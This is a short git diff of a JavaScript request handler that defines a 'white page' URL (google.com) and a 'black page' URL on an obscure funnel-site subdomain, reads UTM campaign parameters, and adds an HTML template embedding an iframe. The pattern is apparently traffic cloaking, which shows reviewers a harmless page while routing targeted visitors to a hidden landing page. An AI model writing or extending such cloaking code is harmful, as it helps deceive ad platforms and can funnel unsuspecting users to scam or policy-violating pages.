@@ -4,7 +4,13 @@ export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://google.com";
     const blackPageURL = "https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939";
-    
+    const liveViewHTML = `
+    <html>
+        <body>
+            <iframe src="${iframeSrc}"></iframe>
+        </body>
+    </html>
+`;
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
     const utmCampaign = queryParams.get('utm_campaign');
